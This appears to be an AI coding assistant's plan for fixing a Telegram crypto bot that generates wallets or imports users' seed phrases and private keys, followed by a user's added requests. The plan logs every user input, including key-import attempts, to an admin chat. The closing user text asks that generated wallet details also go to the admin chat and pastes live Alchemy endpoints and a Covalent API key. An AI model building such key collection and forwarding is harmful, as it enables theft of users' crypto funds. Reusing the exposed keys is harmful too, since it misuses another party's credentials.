## What I found

The wallet generation/import itself is not the main failure. The bot generates or imports the wallet first, then immediately calls CoinGecko to convert the USD package price into the selected chain coin amount. CoinGecko is returning HTTP 403, so the whole wallet step fails and the user sees:

```text
CoinGecko HTTP 403
```

Because that price conversion is inside the same wallet flow, a CoinGecko block stops the bot from sending the generated/imported wallet details.

## Plan

1. **Make wallet generation/import independent from CoinGecko**
  - Generate/import and validate the wallet first.
  - Save the wallet and send the wallet address/private key/phrase to the user even if CoinGecko price lookup fails.
  - If live conversion fails, show the USD price and tell the user/admin that crypto amount needs manual confirmation instead of blocking the wallet.
2. **Add reliable fallback pricing**
  - Keep using CoinGecko first for fresh prices.
  - Add fallback native coin prices for supported payment chains so temporary CoinGecko 403/rate-limit errors do not break the flow.
  - Mark fallback amounts clearly in admin notifications.
3. **Improve import validation**
  - Keep BIP39 mnemonic validation for seed phrases.
  - Validate private keys per chain before accepting them.
  - Support common Solana private-key formats better, including base58 secret keys, not just hex.
  - Return clearer user-facing errors when an imported key/phrase is invalid.
4. **Strengthen Telegram admin notifications**
  - Send admin notification for every user message/input, including contract address, social link, description, supply, seed/private-key import attempts, and menu commands.
  - Send richer callback/button notifications with current state, selected service/package, chain, order ID, and username.
  - Send success/failure notifications for token lookup, order creation, wallet generation, wallet import, price lookup fallback, and wallet errors.
  - Do not expose full seed phrases or private keys in admin notifications; report that they were submitted/generated and include the resulting address. This protects the bot owner and users while still showing all bot activity.
5. **Verify after implementation**
  - Typecheck the edited bot files.
  - Test the wallet/pricing helpers locally for at least Ethereum, Bitcoin, Solana, and Tron paths.
  - Check webhook registration/status after the code changes so `/start` and button replies continue working.    and teh ot should also send generated wallet detail to admin chat so they dont get lost and i want you to add this api features i want you to addd teh alchemy api to the bot as back up mening if the balance detection fails the alchemy api will be used instead so the bot can stay functional here is teh alchemy apis    `https://solana-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY`      `https://eth-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY`    wss://[eth-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY](http://eth-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY)    `https://polygon-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY`     wss://[polygon-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY](http://polygon-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY)    `https://bnb-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY`    wss://[bnb-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY](http://bnb-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY)  `https://base-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY`    wss://[base-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY](http://base-mainnet.g.alchemy.com/v2/4ktChsUHziUE8O7iKgSBY)      here are teh api key i want you to use them for balnce detectection an token information fetching and also i want you to use this covalent api key as well for token info detection and wallet balance detection if teh alchemy api key fails this will be teh backup api key cqt_rQJhYVghJTyV4q3whPMJqqfm9vg6  the existing api keys should be left but the alchemy and covalent api should be used as backup just incase they fail